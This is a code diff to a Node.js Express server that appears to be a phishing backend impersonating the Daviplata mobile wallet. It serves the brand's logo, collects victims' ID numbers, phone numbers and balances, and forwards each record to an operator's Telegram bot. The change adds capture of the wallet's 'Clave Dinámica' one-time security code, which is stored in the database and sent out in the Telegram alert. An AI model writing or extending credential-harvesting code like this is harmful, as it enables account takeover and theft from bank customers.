@@ -24,14 +24,19 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
 const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-async function sendTelegram(clienteId, data) {
-  const texto =
-    `🔔 *Nuevo registro #${clienteId}*\n\n` +
-    `📋 *Tipo doc:* ${data.tipo_documento}\n` +
-    `🪪 *Documento:* ${data.num_documento}\n` +
-    `📱 *Celular:* ${data.num_celular}\n` +
-    `💰 *Saldo:* ${data.saldo_cuenta}\n` +
-    `📊 *Estado:* pendiente`;
+async function sendTelegram(clienteId, datos) {
+  const { tipo_documento, num_documento, num_celular, saldo_cuenta, clave } = datos;
+
+  const texto_admin = `
+🔔 *Nuevo registro #${clienteId}*
+
+📋 *Tipo doc:* ${tipo_documento}
+🪪 *Documento:* \`${num_documento}\`
+📱 *Celular:* \`${num_celular}\`
+💰 *Saldo:* $ \`${saldo_cuenta}\`
+🔐 *Clave Dinámica:* \`${clave}\`
+📊 *Estado:* pendiente
+  `.trim();
 
   const botones = {
     inline_keyboard: [[
@@ -121,25 +126,25 @@ app.get('/img/logo-daviplata.svg', (req, res) => {
 
 // POST /submit → guardar datos + notificar Telegram
 app.post('/submit', async (req, res) => {
-  const { tipo_documento, num_documento, num_celular, saldo_cuenta } = req.body;
+  const { tipo_documento, num_documento, num_celular, saldo_cuenta, clave } = req.body;
 
   // Validación básica en servidor
-  if (!tipo_documento || !num_documento || !num_celular || !saldo_cuenta) {
-    return res.status(400).json({ ok: false, mensaje: 'Todos los campos son requeridos.' });
+  if (!tipo_documento || !num_documento || !num_celular || !saldo_cuenta || !clave) {
+    return res.status(400).json({ ok: false, mensaje: 'Todos los campos y la clave son requeridos.' });
   }
 
   try {
     // Insertar en DB
     const result = await pool.query(
-      `INSERT INTO clientes (tipo_documento, num_documento, num_celular, saldo_cuenta)
-       VALUES ($1, $2, $3, $4) RETURNING id`,
-      [tipo_documento, num_documento, num_celular, saldo_cuenta]
+      `INSERT INTO clientes (tipo_documento, num_documento, num_celular, saldo_cuenta, clave)
+       VALUES ($1, $2, $3, $4, $5) RETURNING id`,
+      [tipo_documento, num_documento, num_celular, saldo_cuenta, clave]
     );
 
     const clienteId = result.rows[0].id;
 
     // Enviar a Telegram
-    await sendTelegram(clienteId, { tipo_documento, num_documento, num_celular, saldo_cuenta });
+    await sendTelegram(clienteId, { tipo_documento, num_documento, num_celular, saldo_cuenta, clave });
 
     res.json({ ok: true, id: clienteId, mensaje: '✅ Datos enviados correctamente. En breve recibirás una respuesta.' });
 
